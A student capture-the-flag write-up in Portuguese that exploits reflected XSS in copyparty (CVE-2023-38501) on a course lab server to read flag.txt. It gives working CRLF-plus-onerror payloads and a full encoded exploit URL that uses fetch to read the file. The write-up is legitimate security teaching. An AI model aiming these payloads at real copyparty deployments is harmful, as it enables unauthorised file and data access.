# CTF Semana #7 (XSS)

Numa primeira fase de reconhecimento, navegou-se pela página como um utilizador normal e estudou-se os pedidos HTTP feitos pela página, em especial quando se carrega no botão `enable k304`.

![](./images/ctf7_1.png)

De facto, a flag encontra-se num local óbvio do servidor `http://ctf-fsi.fe.up.pt:5007/flag.txt`, mas não pode ser acedida diretamente, porque não temos permissões para tal efeito (não estamos autenticados).

Em seguida, verficou-se se existiam vulnerabilidades conhecidas para este serviço e encontrou-se a [CVE-2023-38501](https://nvd.nist.gov/vuln/detail/CVE-2023-38501) - "The application contains a `reflected` cross-site scripting via URL-parameter `?k304=...`".

Testou-se este [PoC](https://github.com/9001/copyparty/security/advisories/GHSA-f54q-j679-p9hh) para verificar se efetivamente exista esta vulnerabilidade:

```
https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

- `%0D%0A%0D%0A` translates to \r\n\r\n (carriage return + newline), effectively injecting a blank line. This blank line signals the end of HTTP headers in some contexts and might allow direct HTML injection into the response body.
- `%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E` é a codificação para:

```html
<img src=copyparty onerror=alert(1)>
```

Tal como se pode ver abaixo, o sistema é vulnerável a este tipo de ataques. Assim que a imagem (inválida) não é carregada aparece a janela de alerta.

![](./images/ctf7_2.png)

Para que o JavaScript no `onerror` carregue o ficheiro flag.txt em vez de simplesmente mostrar um alert, utilizou-se a função `fetch` para carregar o seu conteúdo, depois a sua resposta é convertida para texto e exbibida na janela de alerta.

```html
<img src="copyparty" onerror="fetch('/flag.txt').then(response => response.text()).then(text => alert(text))">
```
Abaixo está a versão codificada, que pode ser obtida facilmente usando por exemplo [este](https://www.urlencoder.org) site.

```
%3Cimg%20src%3D%22copyparty%22%20onerror%3D%22fetch%28%27%2Fflag.txt%27%29.then%28response%20%3D%3E%20response.text%28%29%29.then%28text%20%3D%3E%20alert%28text%29%29%22%3E
```

URL final será: 

```
https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg%20src%3D%22copyparty%22%20onerror%3D%22fetch%28%27%2Fflag.txt%27%29.then%28response%20%3D%3E%20response.text%28%29%29.then%28text%20%3D%3E%20alert%28text%29%29%22%3E
```

![](./images/ctf7_3.png)

O tipo da vulnerabilidade de XSS que permitiu aceder à flag foi o `reflected` tal como já tinha sido dito acima.